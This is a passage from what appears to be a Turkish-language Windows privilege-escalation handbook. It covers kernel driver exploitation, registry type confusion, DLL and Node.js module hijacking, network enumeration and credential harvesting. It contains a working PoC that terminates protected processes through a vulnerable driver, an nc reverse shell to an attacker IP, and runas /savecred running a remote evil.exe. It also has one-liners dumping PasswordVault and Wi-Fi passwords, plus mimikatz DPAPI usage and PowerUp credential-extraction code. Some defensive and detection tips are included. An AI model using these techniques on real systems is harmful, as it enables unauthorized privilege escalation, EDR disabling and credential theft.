ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Bozuk I/O ring üzerinden rastgele kernel okuma/yazma elde ettikten sonra, standart primitive sonrası iş akışını kullanarak bir SYSTEM token çalın:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Registry hive bellek bozulması primitive'leri

Modern hive açıkları deterministik bellek düzenleri oluşturmanıza, yazılabilir HKLM/HKU alt anahtarlarını kötüye kullanmanıza ve özel bir driver olmadan metadata bozulmasını kernel paged-pool taşmalarına dönüştürmenize olanak tanır. Tam zinciri burada öğrenin:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Saldırgan denetimindeki yollardan kaynaklanan `RtlQueryRegistryValues` direct-mode tür karmaşası

Bazı driver'lar userland'den bir registry yolu kabul eder, yalnızca bunun geçerli bir UTF-16 string olduğunu doğrular ve ardından `RTL_QUERY_REGISTRY_DIRECT` ile `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` çağrısını `int readValue` gibi bir stack scalar'ına yapar. `RTL_QUERY_REGISTRY_TYPECHECK` yoksa `EntryContext`, geliştiricinin beklediği türe göre değil, **gerçek** registry türüne göre yorumlanır.

Bu, iki kullanışlı primitive oluşturur:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: Kullanıcının denetimindeki mutlak bir `\Registry\...` yolu, driver'ın saldırganın seçtiği anahtarları sorgulamasına, dönüş kodları/loglar aracılığıyla anahtarların varlığını sızdırmasına ve bazen çağıranın doğrudan erişemediği değerleri okumasına olanak tanır.
- **Kernel bellek bozulması**: `&readValue` gibi bir scalar hedefi, registry değer türüne bağlı olarak `REG_QWORD`, `UNICODE_STRING` veya boyutlandırılmış bir binary buffer olarak tür karmaşasına uğrar.

Pratik exploit notları:

- **Windows 8+ azaltımı**: Sorgu, `RTL_QUERY_REGISTRY_TYPECHECK` olmadan `RTL_QUERY_REGISTRY_DIRECT` kullanan **güvenilmeyen bir hive** üzerinde çalışırsa kernel çağıranları `KERNEL_SECURITY_CHECK_FAILURE (0x139)` ile çöker. Exploit edilebilirliği korumak için `HKCU` altında değerler hazırlamak yerine **güvenilir sistem hive'ları içindeki saldırgan tarafından yazılabilir anahtarları** arayın.
- **Güvenilir hive üzerinde hazırlık**: `\Registry\Machine` altındaki yazılabilir alt anahtarları listelemek için NtObjectManager kullanın ve sandbox bağlamlarından erişilebilen anahtarları bulmak için taramayı çoğaltılmış **düşük bütünlük düzeyindeki** bir token ile yeniden çalıştırın:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: 4-byte `int` üzerine yapılan 8 byte'lık doğrudan yazma, bitişik stack verilerini bozar ve yakındaki bir callback/function pointer'ı kısmen üzerine yazabilir.
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct mode, `EntryContext`'in bir `UNICODE_STRING`'i göstermesini bekler. Kod önce saldırgan kontrollü bir `REG_DWORD` değerini stack scalar'ına yükleyip ardından aynı buffer'ı string okuması için yeniden kullanırsa saldırgan `Length`/`MaximumLength` değerlerini kontrol eder ve `Buffer` pointer'ını kısmen etkiler; böylece kısmen kontrol edilen bir kernel write elde edilir.
- **`REG_BINARY`**: Büyük binary veriler için direct mode, `EntryContext`'teki ilk `LONG` değerini işaretli buffer boyutu olarak ele alır. Önceki bir `REG_DWORD` okuması, yeniden kullanılan scalar'da saldırgan kontrollü **negatif** bir değer bırakırsa sonraki `REG_BINARY` sorgusu saldırganın byte'larını doğrudan bitişik stack slot'larına kopyalar; bu genellikle callback pointer'ının tamamının üzerine yazmanın en kolay yoludur.

Güçlü bir hunting pattern: **aynı stack değişkenine yeniden başlatmadan yapılan farklı türlerde registry okumaları**. `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, yeniden kullanılan `EntryContext` pointer'ları ve ilk registry okumasının ikinci okumanın gerçekleşip gerçekleşmeyeceğini kontrol ettiği code path'leri için grep yapın.

#### Device object'lerde FILE_DEVICE_SECURE_OPEN eksikliğini kötüye kullanma (LPE + EDR kill)

Bazı imzalı üçüncü taraf driver'lar, IoCreateDeviceSecure ile güçlü bir SDDL kullanarak device object oluşturur ancak DeviceCharacteristics içinde FILE_DEVICE_SECURE_OPEN ayarlamayı unutur. Bu flag olmadığında, device fazladan bir bileşen içeren bir path üzerinden açılırken secure DACL uygulanmaz; böylece ayrıcalıksız herhangi bir kullanıcı aşağıdaki gibi bir namespace path kullanarak handle alabilir:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (gerçek dünyadan bir örnek)

Kullanıcı device'ı açabildiğinde, driver'ın sunduğu ayrıcalıklı IOCTL'ler LPE ve tampering için kötüye kullanılabilir. Gerçek dünyada gözlemlenen örnek yetenekler:
- İstenilen process'lere full-access handle döndürme (token theft / DuplicateTokenEx/CreateProcessAsUser üzerinden SYSTEM shell).
- Kısıtlamasız raw disk okuma/yazma (çevrimdışı tampering, boot-time persistence numaraları).
- Protected Process/Light (PP/PPL) dahil olmak üzere istenilen process'leri sonlandırma; böylece kernel üzerinden user land'den AV/EDR kill.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Geliştiriciler için azaltma önlemleri
- DACL ile kısıtlanması amaçlanan aygıt nesnelerini oluştururken her zaman FILE_DEVICE_SECURE_OPEN ayarlayın.
- Ayrıcalıklı işlemler için çağıranın bağlamını doğrulayın. İşlem sonlandırmaya veya handle döndürmeye izin vermeden önce PP/PPL denetimleri ekleyin.
- IOCTL’leri kısıtlayın (erişim maskeleri, METHOD_*, girdi doğrulaması) ve doğrudan kernel ayrıcalıkları yerine brokered modeller kullanmayı değerlendirin.

Savunucular için tespit fikirleri
- Şüpheli aygıt adlarına (ör. \\ .\\amsdk*) yönelik user-mode açma işlemlerini ve kötüye kullanıma işaret eden belirli IOCTL dizilerini izleyin.
- Microsoft’un savunmasız sürücü engelleme listesini (HVCI/WDAC/Smart App Control) uygulayın ve kendi izin/engelleme listelerinizi tutun.


## PATH DLL Hijacking

**PATH üzerinde bulunan bir klasörün içinde yazma izinleriniz** varsa, bir işlem tarafından yüklenen bir DLL’i ele geçirip **ayrıcalıklarınızı yükseltebilirsiniz**.<sup>[[2]](#references)</sup>

PATH içindeki tüm klasörlerin izinlerini kontrol edin:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Bu kontrolün nasıl kötüye kullanılacağı hakkında daha fazla bilgi için:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## `C:\node_modules` üzerinden Node.js / Electron modül çözümleme hijacking'i

Bu, **Node.js** ve **Electron** uygulamalarını, `require("foo")` gibi yalın bir import yaptıklarında ve beklenen modül **bulunamadığında** etkileyen bir **Windows kontrolsüz arama yolu** çeşididir.<sup>[[20]](#references)</sup>

Node, dizin ağacında yukarı doğru ilerleyerek her üst dizindeki `node_modules` klasörlerini kontrol eder. Windows'ta bu arama sürücünün kök dizinine kadar ulaşabilir. Bu nedenle `C:\Users\Administrator\project\app.js` konumundan başlatılan bir uygulama şu konumları yoklayabilir:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

**Düşük ayrıcalıklı bir kullanıcı** `C:\node_modules` oluşturabiliyorsa, buraya kötü amaçlı bir `foo.js` (veya paket klasörü) yerleştirip **daha yüksek ayrıcalıklı bir Node/Electron sürecinin** eksik bağımlılığı çözümlemesini bekleyebilir. Payload, kurban sürecin güvenlik bağlamında çalışır. Bu nedenle hedef yönetici olarak, yükseltilmiş bir zamanlanmış görev/hizmet sarmalayıcısı aracılığıyla veya otomatik başlayan ayrıcalıklı bir masaüstü uygulaması olarak çalıştığında bu durum **LPE**'ye dönüşür.

Bu durum özellikle şu senaryolarda yaygındır:

- bir bağımlılık `optionalDependencies` içinde tanımlandığında<sup>[[22]](#references)</sup>
- üçüncü taraf bir kütüphane `require("foo")` çağrısını `try/catch` içinde sarıp hata durumunda çalışmaya devam ettiğinde
- bir paket production derlemelerinden kaldırıldığında, paketleme sırasında dahil edilmediğinde veya yüklenemediğinde
- güvenlik açığı içeren `require()` çağrısı ana uygulama kodu yerine bağımlılık ağacının derinliklerinde bulunduğunda

### Güvenlik açığı bulunan hedefleri arama

Çözümleme yolunu doğrulamak için **Procmon** kullanın:<sup>[[23]](#references)</sup>

- `Process Name` = hedef yürütülebilir dosya (`node.exe`, Electron uygulamasının EXE'si veya sarmalayıcı süreç) olacak şekilde filtreleyin
- `Path` `contains` `node_modules` olacak şekilde filtreleyin
- `NAME NOT FOUND` sonuçlarına ve `C:\node_modules` altındaki son başarılı açma işlemine odaklanın

Paketlenmemiş `.asar` dosyalarında veya uygulama kaynaklarında aranabilecek kod inceleme kalıpları:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Procmon veya kaynak incelemesiyle **eksik paket adını** belirleyin.
2. Henüz mevcut değilse root lookup dizinini oluşturun:

```powershell
mkdir C:\node_modules
```

3. Tam olarak beklenen ada sahip bir module bırakın:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Kurban uygulamayı tetikleyin. Uygulama `require("foo")` çağrısı yaparsa ve meşru modül mevcut değilse Node, `C:\node_modules\foo.js` dosyasını yükleyebilir.

Bu örüntüye uyan, gerçek dünyada eksik olan isteğe bağlı modüllere `bluebird` ve `utf-8-validate` dahildir; ancak yeniden kullanılabilir olan **teknik** kısımdır: ayrıcalıklı bir Windows Node/Electron sürecinin çözümleyeceği herhangi bir **eksik bare import** bulun.

### Tespit ve güçlendirme önerileri

- Bir kullanıcı `C:\node_modules` oluşturduğunda veya buraya yeni `.js` dosyaları/paketleri yazdığında uyarı verin.
- `C:\node_modules\*` konumundan okuma yapan yüksek bütünlük düzeyindeki süreçleri araştırın.
- Üretimde tüm runtime bağımlılıklarını paketleyin ve `optionalDependencies` kullanımını denetleyin.
- Sessiz `try { require("...") } catch {}` örüntüleri için üçüncü taraf kodları inceleyin.
- Kitaplık destekliyorsa isteğe bağlı kontrolleri devre dışı bırakın (örneğin, bazı `ws` dağıtımları `WS_NO_UTF_8_VALIDATE=1` ile eski `utf-8-validate` kontrolünü önleyebilir).

## Ağ

### Paylaşımlar

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hosts file

hosts dosyasında sabit kodlanmış diğer bilinen bilgisayarları kontrol edin

```
type C:\Windows\System32\drivers\etc\hosts
```

### Ağ Arayüzleri ve DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Açık Portlar

Dışarıdan **kısıtlı hizmetleri** kontrol edin.

```bash
netstat -ano #Opened ports?
```

Yerel bir listener için PID'yi işlemin sahibi, çalıştırılabilir dosyanın yolu ve onu başlatan hizmet veya zamanlanmış görevle ilişkilendirin. Bir remote-control hizmeti, yalnızca kimlik doğrulama ve komut denetimleri izin veriyorsa masaüstü kullanıcısı olarak erişim sağlayabilir. Daha yüksek ayrıcalıklı bir hesapla çalışan özel bir TCP uygulaması ayrı bir inceleme hedefidir: listener ve binary yolu pasif ipuçlarıdır; kimliği doğrulanmış bir bellek bozulması yolu ise tam olarak bu binary'nin ve erişilebilir girdisinin analiz edilmesini gerektirir. Açık bir portun bir sistem sürecine ait olduğu görünüyorsa, arka uç hizmetini ilişkilendirmeden önce [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) çıktısıyla karşılaştırın; tek başına bir yönlendirme kuralı, hedefe erişilebildiğini veya hedefin savunmasız olduğunu kanıtlamaz.

### Yönlendirme Tablosu

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### ARP Tablosu

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Güvenlik Duvarı Kuralları

[**Güvenlik Duvarı ile ilgili komutlar için bu sayfaya göz atın**](../basic-cmd-for-pentesters.md#firewall) **(kuralları listeleme, kural oluşturma, kapatma, kapatma...)**

Ağ numaralandırması için [daha fazla komut burada](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Binary `bash.exe` ayrıca `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` konumunda da bulunabilir.

Root kullanıcısı olursanız herhangi bir portu dinleyebilirsiniz (bir portu dinlemek için `nc.exe`'yi ilk kez kullandığınızda, GUI üzerinden `nc`'ye güvenlik duvarı izni verilip verilmeyeceği sorulur).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Bash'i root olarak kolayca başlatmak için `--default-user root` seçeneğini deneyebilirsiniz.

`WSL` dosya sistemini `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` klasöründe inceleyebilirsiniz.

WSL içindeki Linux `root` kullanıcısı, tek başına Windows Administrator hakları vermez. Mevcut Windows kimliği bir dağıtımın dosya sistemini okuyabiliyorsa, kimlik bilgilerini kaydetmiş olabilecek komutlar için kabuk geçmişi dosyalarını ( `/root/.bash_history` dahil) inceleyin. Yetki yükseltmek için yine de daha yüksek ayrıcalıklı geçerli bir hesap ve izin verilen bir kimlik doğrulama yolu gerekir. `LocalState\rootfs` düzeni eski WSL kurulumları için geçerlidir; WSL 2'de dağıtım genellikle [`ext4.vhdx` sanal diskinde](https://learn.microsoft.com/en-us/windows/wsl/disk-space) saklanır. Bu nedenle önce gerçek dağıtımı ve depolama yolunu belirleyin. Otomatik numaralandırma sırasında geçmiş içeriğini ekrana yazdırmaktan kaçının.

## Windows Kimlik Bilgileri

### Winlogon Kimlik Bilgileri

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

`DefaultUserName` ve `DefaultDomainName` değerlerini kimlik bilgileri değil, hesap bağlamı olarak değerlendirin. Boş olmayan bir `DefaultPassword` veya `AltDefaultPassword` değeri, kayıt defterinde düz metin olarak bulunan bir bulgudur. `AutoAdminLogon=1` olduğu hâlde okunabilir düz metin parola yoksa, bu yalnızca bir ipucudur: [Sysinternals Autologon parolayı LSA secret olarak saklayabilir](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon) ve kayıt defterini sıradan şekilde okumak, bu secret'ın mevcut olup olmadığını veya alınabilir olup olmadığını göstermez. Kimlik bilgilerinin açığa çıktığını bildirmeden önce erişim haklarını ve gerçek oturum açma yapılandırmasını inceleyin.

### Credential Manager / Windows Vault

Şuradan: [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault; sunucular, web siteleri ve **Windows**'un **kullanıcıları otomatik olarak oturum açtırmak** için kullanabileceği diğer programlara ait kimlik bilgilerini saklar. İlk başta bu, kullanıcıların Facebook, Twitter veya Gmail gibi sitelere ait kimlik bilgilerini saklayıp tarayıcıların otomatik oturum açmasını sağlayabileceği anlamına geliyor gibi görünebilir, ancak sistem böyle çalışmaz.

Windows Vault, Windows'un kullanıcıları otomatik olarak oturum açtırabileceği kimlik bilgilerini saklar. Bu da bir kaynağa (sunucuya veya web sitesine) erişmek için kimlik bilgilerine ihtiyaç duyan herhangi bir **Windows uygulamasının** bu **Credential Manager** ve Windows Vault'tan yararlanabileceği ve kullanıcılardan sürekli kullanıcı adı ile parola girmelerini istemek yerine sağlanan kimlik bilgilerini kullanabileceği anlamına gelir.

Uygulamalar Credential Manager ile etkileşime girmediği sürece, belirli bir kaynağa ait kimlik bilgilerini kullanmalarının mümkün olduğunu sanmıyorum. Dolayısıyla uygulamanız kasadan yararlanmak istiyorsa, varsayılan depolama kasasından **o kaynağa ait kimlik bilgilerini istemek için bir şekilde credential manager ile iletişim kurmalıdır**.

Makinede saklanan kimlik bilgilerini listelemek için `cmdkey` kullanın.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Ardından kaydedilmiş kimlik bilgilerini kullanmak için `runas` komutunu `/savecred` seçenekleriyle kullanabilirsiniz. Aşağıdaki örnek, SMB paylaşımı üzerinden uzak bir binary çağırıyor.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Sağlanan kimlik bilgileriyle `runas` kullanma.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) veya [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) üzerinden de kullanılabileceğini unutmayın.

### UWP PasswordVault / Credential Locker

Modern Windows UWP uygulamaları, Microsoft Edge ve modern sistem hizmetleri; kimlik doğrulama token'larını ve plaintext parolaları Universal Windows Platform (UWP) `PasswordVault` içinde saklar (`vaultcmd` içinde `Web Credentials` olarak da gösterilir). Bu depolama alanı oturumdan yalıtılmıştır ve yönetici veya `SeDebugPrivilege` hakları olmadan yerel olarak çözülebilir.

Saklanan tüm kullanıcı adlarını ve plaintext parolaları anında dökmek ve çözmek için bu PowerShell komutunu kullanıcının etkin oturumu içinde çalıştırın:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)**, verilerin simetrik şifrelenmesi için bir yöntem sunar ve Windows işletim sisteminde ağırlıklı olarak asimetrik özel anahtarların simetrik şifrelenmesinde kullanılır. Bu şifreleme, entropiye önemli ölçüde katkıda bulunmak için kullanıcı veya sistem sırrından yararlanır.

**DPAPI, kullanıcının oturum açma sırlarından türetilen bir simetrik anahtar aracılığıyla anahtarların şifrelenmesini sağlar**. Sistem şifrelemesi söz konusu olduğunda sistemin etki alanı kimlik doğrulama sırlarını kullanır.

DPAPI kullanılarak şifrelenen kullanıcı RSA anahtarları, `{SID}` kullanıcının [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) değerini temsil etmek üzere `%APPDATA%\Microsoft\Protect\{SID}` dizininde saklanır. **Kullanıcının özel anahtarlarını koruyan master key ile aynı dosyada bulunan DPAPI anahtarı**, genellikle 64 baytlık rastgele veriden oluşur. (Bu dizine erişimin kısıtlı olduğunu ve içeriğinin CMD'deki `dir` komutuyla listelenemediğini, ancak PowerShell üzerinden listelenebildiğini unutmayın.)

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Bunu çözmek için uygun argümanlarla (`/pvk` veya `/rpc`) **mimikatz module** `dpapi::masterkey` kullanabilirsiniz.

**master password** ile korunan kimlik bilgisi dosyaları genellikle şu konumda bulunur:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

`dpapi::cred` **mimikatz modülünü**, şifre çözmek için uygun `/masterkey` ile kullanabilirsiniz.\
(root iseniz) `sekurlsa::dpapi` modülüyle **bellekten** birçok DPAPI **masterkey** çıkarabilirsiniz.


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials**, şifrelenmiş kimlik bilgilerini kullanışlı bir şekilde saklamak için **scripting** ve otomasyon görevlerinde sıkça kullanılır. Kimlik bilgileri **DPAPI** kullanılarak korunur; bu da genellikle yalnızca oluşturuldukları bilgisayardaki aynı kullanıcı tarafından şifrelerinin çözülebileceği anlamına gelir.

Dışa aktarılmış bir kimlik bilgisi rastgele bir dosya adına veya `.xml` yoluna sahip olabilir. Bir script veya dosya envanteri böyle bir dosyaya işaret ettiğinde, `C:\Users` varsaymak yerine hesabın gerçek profil dizinini bulun: [Windows profilleri başka konumlara yerleştirebilir](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Dosyanın okunabilir olması yalnızca bir ipucudur; [Windows `Export-Clixml`, şifrelenmiş bir kimlik bilgisini dışa aktaran kullanıcıya ve bilgisayara bağlar](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml) ve kurtarılan hesabın hedeflenen hizmette geçerli yetkilere sahip olması ayrıca gerekir. Rutin envanter çıkarma sırasında şifrelenmiş veya düz metin değerleri yazdırmadan önce yolları ve ACL'leri inceleyin.

Bir dosyadaki PS credentials'ın şifresini çözmek için şunu yapabilirsiniz:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wifi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Kaydedilmiş RDP Bağlantıları

Bunları `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
ve `HKCU\Software\Microsoft\Terminal Server Client\Servers\` konumlarında bulabilirsiniz.

### Son Çalıştırılan Komutlar

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Uzak Masaüstü Kimlik Bilgileri Yöneticisi**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Uygun `/masterkey` ile Mimikatz `dpapi::rdg` modülünü kullanarak **.rdg dosyalarının şifresini çözün**\
Mimikatz `sekurlsa::dpapi` modülüyle bellekten **birçok DPAPI masterkey çıkarabilirsiniz**

**mRemoteNG farklı bir bağlantı deposu kullanır.** `%APPDATA%\mRemoteNG` altında ve kullanıcı Documents klasöründe bulunan, `config.xml` gibi sıradan adlara sahip dosyalar da dahil olmak üzere okunabilir XML dosyalarını inceleyin. Bir XML dosyasını kimlik bilgisi adayı olarak değerlendirmeden önce bağlantı şemasını ve şifrelenmiş `Password` özniteliklerini belirleyin. Saklanan değer bir DPAPI/RDCMan parolası değildir; kurtarma işlemi dosyanın şifreleme ayarlarına ve özel bir master password kullanılıp kullanılmadığına bağlıdır. Geniş kapsamlı tarama sırasında şifrelenmiş değerleri yazdırmaktan kaçının.

**Remote Desktop Plus profil dışa aktarımları** da kullanıcı dizinlerinde veya paylaşılan bir yönetim klasöründe okunabilir durumda olabilir. Eski bir `profiles.xml` dışa aktarımında `ProfileName`, `Password` ve `Secure` öğelerini içeren `Data/Profile` girdileri bulunur. Boş olmayan bir parola öğesini, yazdırmadan veya düz metin olduğunu varsaymadan, kimlik bilgisi adayı olarak değerlendirin: [satıcı notlarına göre](https://www.donkz.nl/) profil koruması, profili oluşturan hesaba ve bilgisayara bağlanabilir veya daha gevşek biçimde yapılandırılmış olabilir. Bu dosyaya güvenmeden önce kaynağını ve kurtarma koşullarını doğrulayın.

### Sticky Notes

Kullanıcılar, bunun bir veritabanı dosyası olduğunun farkında olmadan, Windows iş istasyonlarındaki StickyNotes uygulamasında **parolaları** ve diğer bilgileri sık sık **saklar**. Bu dosya `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` konumunda bulunur ve her zaman aranıp incelenmeye değerdir.

Kullanıcılar bazen yapışkan not uygulamalarında parola ve diğer bilgileri saklar. Microsoft'un paketlenmiş Sticky Notes uygulaması notları genellikle `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` konumunda saklar; eski veya farklı uygulamalar LevelDB dahil başka kullanıcı profili depolarını kullanabilir. SQLite dosyasının bulunmamasını not olmadığı şeklinde değerlendirmeden önce yüklü uygulamayı ve depolama biçimini belirleyin.

Sticky Notes SQLite write-ahead logging kullanıyorsa, yalnızca `plum.sqlite` dosyasının kopyası yakın zamanda commit edilmiş notları içermeyebilir. Veritabanının tutarlı bir kopyasıyla birlikte eşleşen `plum.sqlite-wal` dosyasını da alın; varsa `plum.sqlite-shm` dosyasını da ekleyin. Paylaşılan bellek dizini yeniden oluşturulabilir, ancak WAL veritabanının kalıcı durumunun bir parçasıdır. [SQLite'ın WAL belgelerine](https://www.sqlite.org/wal.html) bakın. Hesap adı veya parola içeren bir not, yalnızca bir kimlik bilgisi adayıdır: hesabı, izin verilen erişimi ve parola tekrar kullanımını ayrıca doğrulayın. Şifrelenmiş bir parola yöneticisi kaydının daha yüksek ayrıcalıklı bir oturum açmayı kanıtlayabilmesi için ayrıca gerçek şifre çözme anahtarı ve uygulamaya özgü yorumlama gerekir.

### AppCmd.exe

**AppCmd.exe'den parolaları kurtarmak için Administrator olmanız ve High Integrity seviyesinde çalıştırmanız gerektiğini unutmayın.**\
**AppCmd.exe**, `%systemroot%\system32\inetsrv\` dizininde bulunur.\
Bu dosya varsa, bazı **kimlik bilgilerinin** yapılandırılmış ve **kurtarılabilir** olma ihtimali vardır.

Bu kod [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) projesinden alınmıştır:

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
